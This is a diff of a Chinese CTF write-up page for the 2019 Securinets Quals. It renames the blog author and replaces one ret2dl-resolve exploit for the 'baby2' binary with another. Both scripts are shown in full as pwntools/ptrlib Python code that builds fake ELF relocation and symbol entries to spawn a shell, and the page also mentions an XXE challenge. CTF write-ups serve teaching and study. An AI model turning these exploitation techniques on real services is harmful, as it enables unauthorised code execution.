@@ -16,7 +16,7 @@
   <meta name="description" content="Software Security Researcher">
   <meta name="author" content>
   <meta name="keywords" content>
-  <title>2019-Securinets-CTF-Quals - AssassinQ</title>
+  <title>2019-Securinets-CTF-Quals - B3ale</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -36,7 +36,7 @@
 <!-- 自定义样式保持在最底部 -->
 
 
-<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 
@@ -44,7 +44,7 @@
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
+    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
       <div class="animated-icon"><span></span><span></span><span></span></div>
@@ -778,96 +778,69 @@ p.interactive()
   return read(0, &amp;buf, 0x12Cu);
 }
 </code></pre>
-<p>只有一个 <code>read</code>，直接上 <code>ret2dl-resolve</code> 一把梭，以下是 <a href="https://github.com/ptr-yudai" target="_blank" rel="noopener">Yudai 大佬</a>的 exp，用到了大佬写的库 <a href="https://bitbucket.org/ptr-yudai/ptrlib/src/master/" target="_blank" rel="noopener">ptrlib</a>：</p>
-<pre><code class="python">#!/usr/bin/env python3
-from ptrlib import *
-import time
+<p>只有一个 <code>read</code>，没有泄漏，那就是用 return-to-dl-runtime-resolve，构造 <code>.dynstr</code> 和 <code>.dynsym</code> 来获取 system。这道题应该是用 gcc-4.9 或者更高版本的编译的，溢出这边会用栈上的一个值通过 ecx 来存 esp 的值，直接溢出会让栈毁掉。办法是用 Off-by-One 的思路溢出最后 ecx 的最后一个字节来爆破。下面是不开 ASLR 的版本：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
 
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]
+
+p = process(&#39;./baby2&#39;)
 elf = ELF(&#39;./baby2&#39;)
 
-addr_plt = 0x08048320
-addr_start = elf.symbol(&#39;_start&#39;)
+buf = elf.symbols[&#39;useless&#39;] # 0x804a040
+plt0 = 0x8048320
+pop3_ret = 0x08048509
 
-addr_relplt = elf.section(&#39;.rel.plt&#39;)
-addr_dynsym = elf.section(&#39;.dynsym&#39;)
-addr_dynstr = elf.section(&#39;.dynstr&#39;)
-addr_bss    = elf.section(&#39;.bss&#39;)
+# readelf -a ./baby2 | grep .dynamic
+#   [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
+dynamic = 0x08049f14
+# readelf -a ./baby2 | grep .rel.plt
+#   [10] .rel.plt          REL             080482d8 0002d8 000018 08  AI  5  24  4
+relplt = 0x080482d8
+# readelf -a ./baby2 | grep SYMTAB
+#  0x00000006 (SYMTAB)                     0x80481d0
+dynsym = 0x80481d0
+# readelf -a ./baby2 | grep STRTAB
+#  0x00000005 (STRTAB)                     0x8048240
+dynstr = 0x8048240
 
-rop_pop3 = 0x08048509
-rop_ret = 0x080482fa
+#gdb.attach(p, &#39;b *0x80484a7\nc&#39;)
 
-fname = &#39;system\x00&#39;
-farg  = &#39;/bin/sh\x00&#39;
+def read(addr, size): # addr=&gt;+12 ; size=&gt;+16
+    return p32(read_plt) + p32(pop3_ret) + p32(0) + p32(addr) + p32(size)
 
-plt_read = 0x08048330
-base_stage = addr_bss + 0x800
-addr_reloc = addr_bss + 0xa00
-addr_sym   = addr_bss + 0xa80 | (addr_dynsym &amp; 0xF)
-addr_str   = addr_bss + 8
-addr_arg   = addr_str + len(fname)
+reloc_arg = buf - relplt
+payload = cyclic(100)
+payload = (
+    read(buf, 0x100) +
+    p32(plt0) +
+    p32(reloc_arg) +
+    p32(0xdeadbeef) +
+    p32(buf + 40) # &amp;&quot;/bin/sh\x00&quot;
+).ljust(44, &#39;\x00&#39;)
+payload += &#39;\x9C&#39; # overflow ecx
+p.send(payload)
 
-# Elf32_Rel
-reloc = p32(elf.got(&#39;setvbuf&#39;))
-reloc += p32((((addr_sym - addr_dynsym) // 0x10) &lt;&lt; 8) | 7)
-# Elf32_Sym
-sym = p32(addr_str - addr_dynstr)
-sym += p32(0)
-sym += p32(0)
-sym += p32(0x12)
+pause()
 
-def craft_read(addr, size):
-    payload = p32(plt_read)
-    payload += p32(rop_pop3)
-    payload += p32(0)    # fd
-    payload += p32(addr) # buf
-    payload += p32(size) # size
-    return payload
+padding_size = 16 - ((buf + 8 - dynsym) % 16) # 8
+payload = ( # buf
+    # Elf32_Rel
+    p32(buf) + # r_offset
+    p32(0x7 | (((buf + 8 + padding_size - dynsym) / 16) &lt;&lt; 8)) + # r_info
+    &#39;A&#39; * padding_size + # padding
+    # Elf32_Sym
+    p32(buf + 32 - dynstr) + # st_name
+    p32(0) + # st_value
+    p32(0) + # st_size
+    p32(0x12) + # st_info
+    # buf+32
+    &#39;system\x00\x00&#39; + &#39;/bin/sh\x00&#39;
+)
+p.sendline(payload)
 
-# ncat -vc ./baby2 -kl 8888
-sock = Socket(&#39;127.0.0.1&#39;, 8888)
-# sock = Socket(&#39;51.254.114.246&#39;, 2222)
-
-&#39;&#39;&#39; Stage 1 (probabilistic write) &#39;&#39;&#39;
-payload1 = b&#39;&#39;
-payload1 += p32(rop_ret) * ((0x2c - 6 * 4) // 4)
-payload1 += craft_read(base_stage, 0x100) # 5 * 4
-payload1 += p32(addr_start)               # 4
-payload1 += bytes([0x20])
-
-&#39;&#39;&#39; Stage 2 (stack pivot) &#39;&#39;&#39;
-payload2 = b&#39;A&#39; * 0x2c
-payload2 += p32(base_stage + 4)
-payload2 += b&#39;\x00&#39; * (0x12c - len(payload2))
-
-&#39;&#39;&#39; Stage 3 (craft) &#39;&#39;&#39;
-reloc_offset = addr_reloc - addr_relplt
-
-payload3 = b&#39;&#39;
-payload3 += craft_read(addr_reloc, 0x8)
-payload3 += craft_read(addr_sym, 0x10)
-payload3 += craft_read(addr_str, len(fname))
-payload3 += craft_read(addr_arg, len(farg))
-payload3 += p32(addr_plt)
-payload3 += p32(reloc_offset)
-payload3 += b&#39;XXXX&#39;
-payload3 += p32(addr_arg)
-payload3 += b&#39;\x00&#39; * (0x100 - len(payload3))
-
-# Stage 1
-sock.send(payload1)
-time.sleep(0.5)
-sock.send(payload3)
-
-# Stage 2
-sock.send(payload2)
-
-# Stage 3
-sock.send(reloc)
-sock.send(sym)
-sock.send(fname)
-sock.send(farg)
-
-sock.interactive()
+p.interactive()
 </code></pre>
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Feedback"><a href="#Feedback" class="headerlink" title="Feedback"></a>Feedback</h2><p>这是一道 XXE，通过 burpsuite 抓包，然后直接利用<a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection" target="_blank" rel="noopener">网上的 exp</a>看到：</p>
 <p><img src="/pics/2019-Securinets-CTF-Quals/4.png" srcset="/img/loading.gif" alt></p>
